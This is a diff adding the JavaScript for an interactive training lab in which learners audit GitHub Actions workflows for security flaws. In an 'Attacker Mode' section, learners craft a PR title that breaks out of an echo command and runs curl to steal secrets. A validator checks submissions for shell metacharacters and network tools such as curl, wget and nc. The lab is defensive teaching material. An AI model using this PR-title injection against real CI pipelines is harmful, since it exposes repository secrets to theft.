+        function getTabStatus(wfIndex) {
+            var wf = WORKFLOWS[wfIndex];
+            if (state.phase === 'audit') {
+                var hasFlagged = wf.vulns.some(function(vi) { return state.identifiedVulns[VULNS[vi].id]; });
+                return hasFlagged ? 'flagged' : '';
+            }
+            if (state.phase === 'report' || state.submitted) {
+                var allFound = wf.vulns.every(function(vi) { return state.identifiedVulns[VULNS[vi].id]; });
+                return allFound ? 'clean' : 'missed';
+            }
+            return '';
+        }
+
+        // =====================================================================
+        // RENDER: YAML Display
+        // =====================================================================
+        function renderYaml() {
+            var display = document.getElementById('yamlDisplay');
+            var wf = WORKFLOWS[state.currentWorkflow];
+            display.innerHTML = '';
+
+            wf.yaml.forEach(function(line, i) {
+                var div = document.createElement('div');
+                div.className = 'yaml-line';
+
+                // Check if this line is a vulnerability line
+                var vulnForLine = null;
+                VULNS.forEach(function(v) {
+                    if (v.workflow === state.currentWorkflow && v.line === i) vulnForLine = v;
+                });
+
+                var flagKey = state.currentWorkflow + '-' + i;
+                var isFlag = state.flaggedLines[flagKey];
+
+                if (state.submitted && vulnForLine) {
+                    div.className += state.identifiedVulns[vulnForLine.id] ? ' correct-flag' : ' missed-flag';
+                } else if (isFlag) {
+                    div.className += ' flagged';
+                }
+
+                // Line number
+                var numSpan = document.createElement('span');
+                numSpan.className = 'line-num';
+                numSpan.textContent = i + 1;
+                div.appendChild(numSpan);
+
+                // Content
+                var contentSpan = document.createElement('span');
+                contentSpan.className = 'line-content';
+                contentSpan.innerHTML = syntaxHighlight(line);
+                div.appendChild(contentSpan);
+
+                // Flag icon
+                var flagIcon = document.createElement('span');
+                flagIcon.className = 'line-flag-icon';
+                flagIcon.innerHTML = '<img src="../../../../../assets/images/icons/icon-alert.webp" alt="flag">';
+                div.appendChild(flagIcon);
+
+                if (state.phase === 'audit' && !state.submitted) {
+                    div.onclick = function() { handleLineClick(i, vulnForLine); };
+                }
+
+                display.appendChild(div);
+            });
+        }
+
+        function syntaxHighlight(line) {
+            if (!line.trim()) return '&nbsp;';
+            var escaped = line.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            // Comments
+            if (escaped.trim().startsWith('#')) return '<span class="y-comment">' + escaped + '</span>';
+            // Key-value
+            escaped = escaped.replace(/^(\s*)([\w-]+)(:)/gm, '$1<span class="y-key">$2</span><span class="y-key">$3</span>');
+            // Strings in quotes
+            escaped = escaped.replace(/"([^"]*?)"/g, '"<span class="y-str">$1</span>"');
+            escaped = escaped.replace(/'([^']*?)'/g, '\'<span class="y-str">$1</span>\'');
+            // Expression interpolation — highlight dangerous ones
+            escaped = escaped.replace(/\$\{\{([^}]*?)\}\}/g, function(match, inner) {
+                if (inner.includes('github.event.pull_request.title') || inner.includes('github.event.pull_request.body')) {
+                    return '<span class="y-danger">${{ ' + inner + ' }}</span>';
+                }
+                return '<span class="y-bracket">${{ ' + inner + ' }}</span>';
+            });
+            // Booleans
+            escaped = escaped.replace(/:\s+(true|false)/g, ': <span class="y-bool">$1</span>');
+            // Actions (uses:)
+            escaped = escaped.replace(/(uses:\s*)(.+)/g, '$1<span class="y-action">$2</span>');
+            return escaped;
+        }
+
+        // =====================================================================
+        // LINE CLICK HANDLER
+        // =====================================================================
+        function handleLineClick(lineIndex, vulnForLine) {
+            var flagKey = state.currentWorkflow + '-' + lineIndex;
+
+            if (vulnForLine && !state.identifiedVulns[vulnForLine.id]) {
+                // Correct: this is a vulnerable line
+                state.flaggedLines[flagKey] = true;
+                state.identifiedVulns[vulnForLine.id] = { classified: false, classCorrect: false, fixed: false, fixPass: false };
+                renderYaml();
+                renderTabs();
+                renderRightPanel();
+                updateStats();
+            } else if (!vulnForLine) {
+                // Wrong line — brief flash
+                state.flaggedLines[flagKey] = true;
+                renderYaml();
+                setTimeout(function() {
+                    delete state.flaggedLines[flagKey];
+                    renderYaml();
+                }, 600);
+            }
+        }
+
+        // =====================================================================
+        // RENDER: Right Panel
+        // =====================================================================
+        function renderRightPanel() {
+            var body = document.getElementById('rightPanelBody');
+
+            if (state.phase === 'audit') {
+                renderAuditPhase(body);
+            } else if (state.phase === 'attacker') {
+                renderAttackerPhase(body);
+            } else if (state.phase === 'report') {
+                renderReportPhase(body);
+            }
+
+            // Update phase indicators
+            document.querySelectorAll('.phase-step').forEach(function(el) {
+                el.classList.remove('active', 'done');
+                var p = el.getAttribute('data-phase');
+                if (p === state.phase) el.classList.add('active');
+                if (state.phase === 'attacker' && p === 'audit') el.classList.add('done');
+                if (state.phase === 'report' && (p === 'audit' || p === 'attacker')) el.classList.add('done');
+            });
+        }
+
+        // =====================================================================
+        // AUDIT PHASE
+        // =====================================================================
+        function renderAuditPhase(container) {
+            var html = '';
+            var foundVulns = Object.keys(state.identifiedVulns);
+
+            if (foundVulns.length === 0) {
+                html += '<div class="audit-intro">';
+                html += '<h3>Security Audit Simulation</h3>';
+                html += '<p>You have been assigned to audit 5 GitHub Actions workflow files from a repository. Each workflow contains at least one security vulnerability.</p>';
+                html += '<p>Review the YAML on the left. <strong>Click on suspicious lines</strong> to flag them. For each finding, you will classify the vulnerability type and write a fix.</p>';
+                html += '<div style="margin-top:16px;">';
+                html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:12px;color:var(--text-dim)">';
+                html += '<span style="display:inline-block;width:12px;height:3px;background:var(--red)"></span> Flagged line</div>';
+                html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:12px;color:var(--text-dim)">';
+                html += '<span style="display:inline-block;width:12px;height:3px;background:var(--green)"></span> Confirmed vulnerability</div>';
+                html += '<div style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text-dim)">';
+                html += '<span style="display:inline-block;width:12px;height:3px;background:var(--orange)"></span> Missed vulnerability (shown after submit)</div>';
+                html += '</div>';
+                html += '</div>';
+            } else {
+                html += '<div class="audit-section">';
+                html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">';
+                html += '<h3 style="font-size:15px;font-weight:700;color:#fff;margin:0;">Findings (' + foundVulns.length + ' / ' + VULNS.length + ')</h3>';
+                html += '</div>';
+
+                // Render each found vulnerability
+                foundVulns.forEach(function(vulnId) {
+                    var vuln = VULNS.find(function(v) { return v.id === vulnId; });
+                    var vState = state.identifiedVulns[vulnId];
+                    html += renderFindingCard(vuln, vState);
+                });
+
+                html += '<div class="btn-row" style="justify-content:flex-end;margin-top:20px;border-top:1px solid var(--border);padding-top:16px;">';
+                html += '<span style="font-size:11px;color:var(--text-dim);flex:1;">Find all 7 vulnerabilities or submit with what you have</span>';
+                html += '<button class="btn btn-primary" onclick="window._submitAudit()">Submit Audit</button>';
+                html += '</div>';
+
+                html += '</div>';
+            }
+
+            container.innerHTML = html;
+
+            // Attach MC and fix handlers
+            foundVulns.forEach(function(vulnId) {
+                attachFindingHandlers(vulnId);
+            });
+        }
+
+        function renderFindingCard(vuln, vState) {
+            var severityClass = 'severity-' + vuln.severity;
+            var html = '<div class="finding-card' + (vState.classified ? '' : ' active') + '" id="finding-' + vuln.id + '">';
+            html += '<div class="finding-header">';
+            html += '<span class="finding-severity ' + severityClass + '">' + vuln.severity + '</span>';
+            html += '<span class="finding-title">' + vuln.title + '</span>';
+            html += '</div>';
+            html += '<div class="finding-location">' + WORKFLOWS[vuln.workflow].name + ' : line ' + (vuln.line + 1) + '</div>';
+            html += '<div class="finding-desc">' + vuln.description + '</div>';
+
+            // Multiple choice — classify the vulnerability
+            if (!vState.classified) {
+                html += '<div style="font-size:12px;font-weight:600;color:var(--forge);margin-bottom:8px;">What type of vulnerability is this?</div>';
+                html += '<div class="mc-options" id="mc-' + vuln.id + '">';
+                vuln.mcOptions.forEach(function(opt, i) {
+                    html += '<div class="mc-option" data-vuln="' + vuln.id + '" data-idx="' + i + '" data-correct="' + opt.correct + '">';
+                    html += '<span class="mc-radio"></span>';
+                    html += '<span>' + opt.text + '</span>';
+                    html += '</div>';
+                });
+                html += '</div>';
+            } else {
+                html += '<div style="font-size:12px;margin-bottom:8px;padding:6px 10px;border-radius:4px;' +
+                    (vState.classCorrect ? 'background:rgba(34,197,94,0.1);color:var(--green);' : 'background:rgba(239,68,68,0.1);color:var(--red);') +
+                    '">' + (vState.classCorrect ? 'Correctly classified: ' + CATEGORIES[vuln.category] : 'Incorrect classification. Correct: ' + CATEGORIES[vuln.category]) + '</div>';
+            }
+
+            // Fix area
+            if (vState.classified) {
+                html += '<div class="fix-area">';
+                html += '<label>Write the fix (replace the vulnerable line/block):</label>';
+                html += '<textarea class="fix-textarea" id="fix-' + vuln.id + '" placeholder="' + vuln.fixHint + '"' +
+                    (vState.fixed ? ' disabled' : '') + '>' + (vState.fixText || '') + '</textarea>';
+                if (!vState.fixed) {
+                    html += '<div class="btn-row"><button class="btn btn-primary" onclick="window._checkFix(\'' + vuln.id + '\')">Check Fix</button>';
+                    html += '<button class="btn btn-ghost" onclick="window._showFixHint(\'' + vuln.id + '\')">Hint</button></div>';
+                } else {
+                    var resultClass = vState.fixPass === true ? 'fix-correct' : (vState.fixPass === 'partial' ? 'fix-partial' : 'fix-incorrect');
+                    html += '<div class="fix-result ' + resultClass + '">' + (vState.fixMsg || '') + '</div>';
+                }
+                html += '</div>';
+            }
+
+            html += '</div>';
+            return html;
+        }
+
+        function attachFindingHandlers(vulnId) {
+            var mcContainer = document.getElementById('mc-' + vulnId);
+            if (!mcContainer) return;
+            var options = mcContainer.querySelectorAll('.mc-option');
+            options.forEach(function(opt) {
+                opt.onclick = function() {
+                    var isCorrect = opt.getAttribute('data-correct') === 'true';
+                    // Mark all options
+                    options.forEach(function(o) {
+                        o.classList.remove('selected');
+                        if (o.getAttribute('data-correct') === 'true') o.classList.add('correct');
+                        else if (o === opt && !isCorrect) o.classList.add('incorrect');
+                    });
+                    state.identifiedVulns[vulnId].classified = true;
+                    state.identifiedVulns[vulnId].classCorrect = isCorrect;
+                    updateStats();
+                    // Re-render after brief delay to show answer
+                    setTimeout(function() { renderRightPanel(); }, 800);
+                };
+            });
+        }
+
+        // =====================================================================
+        // FIX VALIDATION (global handlers)
+        // =====================================================================
+        window._checkFix = function(vulnId) {
+            var textarea = document.getElementById('fix-' + vulnId);
+            if (!textarea) return;
+            var input = textarea.value.trim();
+            if (!input) return;
+
+            var vuln = VULNS.find(function(v) { return v.id === vulnId; });
+            var result = vuln.fixValidate(input);
+
+            state.identifiedVulns[vulnId].fixed = true;
+            state.identifiedVulns[vulnId].fixPass = result.pass;
+            state.identifiedVulns[vulnId].fixMsg = result.msg;
+            state.identifiedVulns[vulnId].fixText = input;
+            updateStats();
+            renderRightPanel();
+        };
+
+        window._showFixHint = function(vulnId) {
+            var vuln = VULNS.find(function(v) { return v.id === vulnId; });
+            var textarea = document.getElementById('fix-' + vulnId);
+            if (textarea && !textarea.value.trim()) {
+                textarea.placeholder = 'Example:\n' + vuln.fixExample;
+            }
+        };
+
+        window._submitAudit = function() {
+            state.submitted = true;
+            // Mark all missed vulns on the YAML
+            VULNS.forEach(function(v) {
+                if (!state.identifiedVulns[v.id]) {
+                    var flagKey = v.workflow + '-' + v.line;
+                    state.flaggedLines[flagKey] = true;
+                }
+            });
+            state.phase = 'attacker';
+            render();
+        };
+
+        // =====================================================================
+        // ATTACKER MODE
+        // =====================================================================
+        function renderAttackerPhase(container) {
+            var html = '<div class="attacker-section">';
+            html += '<h3><img src="../../../../../assets/images/icons/icon-alert.webp" alt=""> Attacker Mode: Bonus Round</h3>';
+            html += '<p class="attacker-desc">You found the script injection vulnerability in <strong>pr-greet.yml</strong>. Now prove it is exploitable. The workflow runs this shell command on every PR:</p>';
+            html += '<div style="background:var(--bg-code);padding:12px 16px;border-radius:6px;margin-bottom:16px;font-family:\'Cascadia Code\',monospace;font-size:12px;color:#e6edf3;line-height:1.6;">';
+            html += 'echo "Thanks for the PR: ${{ github.event.pull_request.title }}"<br>';
+            html += 'gh pr comment ${{ github.event.number }} \\<br>';
+            html += '&nbsp;&nbsp;--body "Welcome! Your PR \'${{ github.event.pull_request.title }}\' is under review."';
+            html += '</div>';
+
+            // Challenge 1: Craft a malicious PR title
+            html += '<div class="attacker-challenge">';
+            html += '<h4>Challenge: Craft a malicious PR title</h4>';
+            html += '<p style="font-size:12px;color:var(--text-dim);margin-bottom:10px;">Write a PR title that would break out of the echo command and execute <code>curl</code> to exfiltrate secrets. The title will be interpolated directly into the shell.</p>';
+            html += '<input type="text" class="attacker-input" id="attackInput1" placeholder="Enter your malicious PR title..." value="' + (state.attackerInput1 || '') + '"' + (state.attackerComplete ? ' disabled' : '') + '>';
+            html += '<div class="attacker-hint">Hint: Think about shell metacharacters that terminate the echo command</div>';
+            if (!state.attackerComplete) {
+                html += '<div class="btn-row"><button class="btn btn-danger" onclick="window._testAttack()">Execute Attack</button></div>';
+            }
+            html += '<div id="attackResult1"></div>';
+            html += '</div>';
+
+            // Challenge 2: What would the expanded shell command look like?
+            html += '<div class="attacker-challenge">';
+            html += '<h4>Challenge: What happens after interpolation?</h4>';
+            html += '<p style="font-size:12px;color:var(--text-dim);margin-bottom:10px;">Given your malicious title, show the expanded shell command that would actually execute:</p>';
+            html += '<input type="text" class="attacker-input" id="attackInput2" placeholder="echo ..." value="' + (state.attackerInput2 || '') + '"' + (state.attackerComplete ? ' disabled' : '') + '>';
+            html += '<div id="attackResult2"></div>';
+            html += '</div>';
+
+            if (state.attackerComplete) {
+                html += '<div style="text-align:center;padding:16px 0;border-top:1px solid var(--border);margin-top:16px;">';
+                html += '<p style="font-size:13px;color:var(--text-dim);margin-bottom:12px;">Attacker Mode complete. Bonus points: ' + state.attackerScore + ' / 2</p>';
+                html += '<button class="btn btn-primary" onclick="window._goToReport()">View Security Report</button>';
+                html += '</div>';
+            }
+
+            html += '</div>';
+            container.innerHTML = html;
+        }
+
+        window._testAttack = function() {
+            var input1 = document.getElementById('attackInput1').value.trim();
+            var input2 = document.getElementById('attackInput2').value.trim();
+            var r1 = document.getElementById('attackResult1');
+            var r2 = document.getElementById('attackResult2');
+            state.attackerInput1 = input1;
+            state.attackerInput2 = input2;
+            var score = 0;
+
+            // Validate attack payload
+            if (input1) {
+                var hasBreakout = /[";`|]/.test(input1) || input1.includes('$(');
+                var hasExfil = /curl|wget|nc |netcat|bash|sh |python/i.test(input1);
+                if (hasBreakout && hasExfil) {
+                    r1.innerHTML = '<div class="attacker-result attacker-success">Attack payload viable. The shell would interpret your metacharacters and execute the injected command.</div>';
+                    score++;
+                } else if (hasBreakout) {
+                    r1.innerHTML = '<div class="attacker-result attacker-fail">You broke out of the string, but did not include an exfiltration command (curl, wget, etc.).</div>';
+                } else {
+                    r1.innerHTML = '<div class="attacker-result attacker-fail">No shell breakout detected. Use characters like ", ;, `, $() to escape the echo context.</div>';
+                }
+            }
+
+            // Validate expanded command
+            if (input2) {
+                var looksExpanded = input2.includes('echo') && (/[";`|]/.test(input2) || input2.includes('$('));
+                var showsInjection = /curl|wget|nc |bash|sh /i.test(input2);
+                if (looksExpanded && showsInjection) {
+                    r2.innerHTML = '<div class="attacker-result attacker-success">Correct. This shows how the interpolation creates a command injection.</div>';
+                    score++;
+                } else {
+                    r2.innerHTML = '<div class="attacker-result attacker-fail">Show the full echo command with your title interpolated, demonstrating the injection.</div>';
+                }
+            }
+
+            state.attackerScore = score;
+            state.attackerComplete = true;
+            renderAttackerPhase(document.getElementById('rightPanelBody'));
+        };
+
+        window._goToReport = function() {
+            state.phase = 'report';
+            render();
+        };
+
+        // =====================================================================
+        // REPORT PHASE
+        // =====================================================================
+        function renderReportPhase(container) {
+            var totalVulns = VULNS.length;
+            var found = Object.keys(state.identifiedVulns).length;
+            var correctClass = 0;
+            var fixedCorrect = 0;
+            var fixedPartial = 0;
+            var fixedAttempted = 0;
+
+            Object.keys(state.identifiedVulns).forEach(function(vid) {
+                var vs = state.identifiedVulns[vid];
+                if (vs.classCorrect) correctClass++;
+                if (vs.fixed) {
+                    fixedAttempted++;
+                    if (vs.fixPass === true) fixedCorrect++;
+                    else if (vs.fixPass === 'partial') fixedPartial++;
+                }
+            });
+
+            // Calculate score
+            var findScore = (found / totalVulns) * 40; // 40% for finding
+            var classScore = (correctClass / Math.max(found, 1)) * 20; // 20% for classification
+            var fixScore = ((fixedCorrect + fixedPartial * 0.5) / Math.max(found, 1)) * 30; // 30% for fixes
+            var attackScore = (state.attackerScore / 2) * 10; // 10% for attacker mode
+            var totalScore = Math.round(findScore + classScore + fixScore + attackScore);
+
+            var grade, gradeColor;
+            if (totalScore >= 90) { grade = 'A'; gradeColor = 'var(--green)'; }
+            else if (totalScore >= 80) { grade = 'B'; gradeColor = 'var(--cyan)'; }
+            else if (totalScore >= 70) { grade = 'C'; gradeColor = 'var(--orange)'; }
+            else if (totalScore >= 60) { grade = 'D'; gradeColor = 'var(--orange)'; }
+            else { grade = 'F'; gradeColor = 'var(--red)'; }
+
+            var html = '<div class="report-section">';
+            html += '<h3>Security Audit Report</h3>';
+
+            // Grade
+            html += '<div class="report-grade" style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;">';
+            html += '<div class="report-grade-letter" style="color:' + gradeColor + ';">' + grade + '</div>';
+            html += '<div class="report-grade-label">Overall Score: ' + totalScore + '%</div>';
+            html += '</div>';
+
+            // Summary rows
+            html += '<div style="margin-bottom:20px;">';
+            html += '<div class="report-row"><span class="report-row-label">Vulnerabilities Found</span><span class="report-row-value">' + found + ' / ' + totalVulns + '</span></div>';
+            html += '<div class="report-row"><span class="report-row-label">Correctly Classified</span><span class="report-row-value">' + correctClass + ' / ' + found + '</span></div>';
+            html += '<div class="report-row"><span class="report-row-label">Fixes Validated</span><span class="report-row-value">' + fixedCorrect + ' correct, ' + fixedPartial + ' partial / ' + fixedAttempted + ' attempted</span></div>';
+            html += '<div class="report-row"><span class="report-row-label">Attacker Mode</span><span class="report-row-value">' + state.attackerScore + ' / 2 challenges</span></div>';
+            html += '<div class="report-row" style="border-bottom:none;"><span class="report-row-label">Detection Rate</span><span class="report-row-value">' + Math.round((found / totalVulns) * 100) + '%</span></div>';
+            html += '</div>';
+
+            // Scoring breakdown
+            html += '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:20px;">';
+            html += '<div style="font-size:12px;font-weight:600;color:var(--forge);margin-bottom:10px;">SCORING BREAKDOWN</div>';
+            html += renderScoreBar('Detection (40%)', findScore, 40);
+            html += renderScoreBar('Classification (20%)', classScore, 20);
+            html += renderScoreBar('Remediation (30%)', fixScore, 30);
+            html += renderScoreBar('Attacker Mode (10%)', attackScore, 10);
+            html += '</div>';
+
+            // Individual findings
+            html += '<div class="report-findings">';
+            html += '<div style="font-size:13px;font-weight:600;color:#fff;margin-bottom:12px;">Detailed Findings</div>';
+
+            VULNS.forEach(function(v) {
+                var vs = state.identifiedVulns[v.id];
+                var found = !!vs;
+                html += '<div class="report-finding">';
+                html += '<div class="report-finding-title">';
+                html += '<span class="finding-severity severity-' + v.severity + '" style="margin-right:8px;">' + v.severity + '</span>';
+                html += v.title + '</div>';
+                html += '<div style="font-size:11px;color:var(--text-dim);margin-bottom:4px;">' + WORKFLOWS[v.workflow].name + ' : line ' + (v.line + 1) + '</div>';
+                if (found) {
+                    html += '<div class="report-finding-status" style="color:var(--green);">';
+                    html += 'Found' + (vs.classCorrect ? ' + Correctly classified' : ' + Misclassified');
+                    if (vs.fixed) html += (vs.fixPass === true ? ' + Fix validated' : vs.fixPass === 'partial' ? ' + Partial fix' : ' + Fix rejected');
+                    html += '</div>';
+                } else {
+                    html += '<div class="report-finding-status" style="color:var(--red);">Missed</div>';
+                    html += '<div style="font-size:12px;color:var(--text-dim);margin-top:4px;">' + v.description + '</div>';
+                }
+                html += '</div>';
+            });
+
+            html += '</div>';
+
+            // Completion
+            html += '<div class="complete-section">';
+            html += '<button class="complete-btn" onclick="window._completeLab()">Complete Lab</button>';
+            html += '</div>';
+
+            html += '</div>';
+            container.innerHTML = html;
+        }
+
+        function renderScoreBar(label, earned, max) {
+            var pct = Math.round((earned / max) * 100);
+            var color = pct >= 80 ? 'var(--green)' : pct >= 50 ? 'var(--orange)' : 'var(--red)';
+            var html = '<div style="margin-bottom:10px;">';
+            html += '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-dim);margin-bottom:4px;"><span>' + label + '</span><span>' + Math.round(earned) + ' / ' + max + '</span></div>';
+            html += '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;">';
+            html += '<div style="height:100%;width:' + pct + '%;background:' + color + ';border-radius:3px;transition:width 0.5s;"></div>';
+            html += '</div></div>';
+            return html;
+        }
+
+        // =====================================================================
+        // COMPLETION
+        // =====================================================================
+        window._completeLab = function() {
+            try {
+                var progress = JSON.parse(localStorage.getItem('hexworth_forge_progress') || '{}');
+                progress['do-113'] = Date.now();
+                localStorage.setItem('hexworth_forge_progress', JSON.stringify(progress));
+            } catch(e) {}
+
+            if (typeof ModuleProgress !== 'undefined') {
+                ModuleProgress.complete('code', 'do-113-security-audit', { returnToDashboard: false });
+            }
+
+            var btn = document.querySelector('.complete-btn');
+            if (btn) {
+                btn.textContent = 'Completed!';
+                btn.style.background = 'rgba(59,130,246,0.2)';
+                btn.style.color = '#3b82f6';
+                btn.style.cursor = 'default';
+                btn.onclick = null;
+            }
+        };
+
+        // =====================================================================
+        // STATS
+        // =====================================================================
+        function updateStats() {
+            var found = Object.keys(state.identifiedVulns).length;
+            var fixed = 0;
+            Object.keys(state.identifiedVulns).forEach(function(vid) {
+                if (state.identifiedVulns[vid].fixPass) fixed++;
+            });
+            var score = Math.round((found / VULNS.length) * 100);
+
+            document.getElementById('statFound').textContent = found;
+            document.getElementById('statFixed').textContent = fixed;
+            document.getElementById('statScore').textContent = score + '%';
+            document.getElementById('fileCount').textContent = getAuditedFiles() + ' / 5 audited';
+        }
+
+        function getAuditedFiles() {
+            var files = {};
+            Object.keys(state.identifiedVulns).forEach(function(vid) {
+                var v = VULNS.find(function(x) { return x.id === vid; });
+                if (v) files[v.workflow] = true;
+            });
+            return Object.keys(files).length;
+        }
+
+        // =====================================================================
+        // MAIN RENDER
+        // =====================================================================
+        function render() {
+            renderTabs();
+            renderYaml();
+            renderRightPanel();
+            updateStats();
+        }
+
+        // =====================================================================
+        // INIT
+        // =====================================================================
+        render();
+
+        // Check if already completed
+        try {
+            var p = JSON.parse(localStorage.getItem('hexworth_forge_progress') || '{}');
+            if (p['do-113']) {
+                // Already done — no special UI needed, they can redo the lab
+            }
+        } catch(e) {}
+    })();
+    </script>
+    <script src="../../../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
